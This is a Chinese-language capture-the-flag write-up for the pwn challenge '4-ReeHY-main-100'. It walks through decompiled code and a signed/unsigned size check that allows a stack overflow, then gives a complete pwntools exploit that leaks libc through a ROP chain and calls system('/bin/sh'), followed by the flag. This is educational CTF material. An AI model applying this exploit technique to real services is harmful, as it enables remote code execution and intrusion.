# 4-ReeHY-main-100

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=c0e53c01-0323-495d-90dc-85eaa97ce2fe_2)

我还是用个简单的方法做吧，unlink那个真的看不明白，题做得太少了。简单做法还是能学到东西的，但不多。(･_･;

看看main，难得这么看见这么清晰的菜单实现。

```c
void Main(void)
{
  undefined4 uVar1;
  SetUp();
  do {
    PrintMenu();
    uVar1 = GetInput();
    switch(uVar1) {
    default:
      puts("Invalid Choice!");
      break;
    case 1:
      Create();
      break;
    case 2:
      Delete();
      break;
    case 3:
      Edit();
      break;
    case 4:
      Show();
      break;
    case 5:
      puts("bye~bye~ young hacker");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
  } while( true );
}
```

然后checksec。这两步操作我现在闭着眼睛都会做。

-   Arch:     amd64-64-little
    <br>RELRO:    Partial RELRO
    <br>Stack:    No canary found
    <br>NX:       NX enabled
    <br>PIE:      No PIE (0x400000)

简单做法只用看Create函数创建时的问题。跟unlink做法比起来完全不是一个难度等级，怀疑是出题失误。

```c
void Create(void)
{
  undefined local_98 [128];
  void *local_18;
  int local_10;
  uint local_c;
  if (DAT_006020ac < 5) {
    puts("Input size");
    local_c = GetInput();
    if ((int)local_c < 0x1001) {
      puts("Input cun");
      local_10 = GetInput();
      if (local_10 < 5) {
        local_18 = malloc((long)(int)local_c);
        puts("Input content");
        if ((int)local_c < 0x71) {
          read(0,local_98,(ulong)local_c);
          memcpy(local_18,local_98,(long)(int)local_c);
        }
        else {
          read(0,local_18,(ulong)local_c);
        }
        *(uint *)((long)local_10 * 4 + DAT_006020c0) = local_c;
        *(void **)(&DAT_006020e0 + (long)local_10 * 0x10) = local_18;
        *(undefined4 *)(&DAT_006020e8 + (long)local_10 * 0x10) = 1;
        DAT_006020ac = DAT_006020ac + 1;
        fflush(stdout);
      }
    }
  }
  return;
}
```

对于ghidra玩家来说，这题的关键是把鼠标移到local_c上。为什么呢？因为这样你就会发现local_c是一个unsigned integer，意味着它没有符号，负数会被看作是一个超级大的数。在if ((int)local_c < 0x1001)和local_18 = malloc((long)(int)local_c);和memcpy(local_18,local_98,(long)(int)local_c);中都将其转换为了有符号整数，除了那句read，是一个无符号长整数。再仔细看看，local_98也就是read的目标变量，是在栈上的，且有大小。成功从5级堆题降级为3级栈题。直接上exp吧，看出来后还是很简单的（但是我最开始没看出来，菜狗）

```python
from pwn import *
p = remote('61.147.171.105', 55434)
def send_choice(payload):
	p.sendlineafter('$ ', payload)
def create_exploit(payload):
	send_choice('A')
	send_choice('1')
	p.sendlineafter('Input size\n', '-1')
	p.sendlineafter('Input cun\n', '-1')
	p.sendlineafter('Input content\n', payload)
pop_rdi_ret = 0x400da3
puts_got =6299680
puts_plt = 4196048
main_addr = 0x400C8C
nIndexCun = 10
nInputSize = 0
leak_head = b'A'*0x88 + p32(nIndexCun) + p32(nInputSize) + b'A'*8
payload = leak_head + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
create_exploit(payload)
puts_addr = u64(p.recvn(6).ljust(8, b'\x00'))
system_offset=-0x2a300
bin_sh_offset=0x11d6c7
payload = leak_head + p64(pop_rdi_ret) + p64(puts_addr+bin_sh_offset) + p64(puts_addr+system_offset) + p64(main_addr)
create_exploit(payload)
p.interactive()
```

攻防世界给的libc好像不对啊，我用在线网站一个一个查的偏移。这次溢出填充字符有一些不能乱填，因为下面还有个memcpy，要用local_c；再下面还要用local_10，而这两个参数都是在local_98上面的，要小心点。

至于堆玩法……下次我不偷懒了，真的,很快我就会学了(･･;)。

- ### Flag
  > cyberpeace{ba0c20b5283bbf26f048009302ac57b6}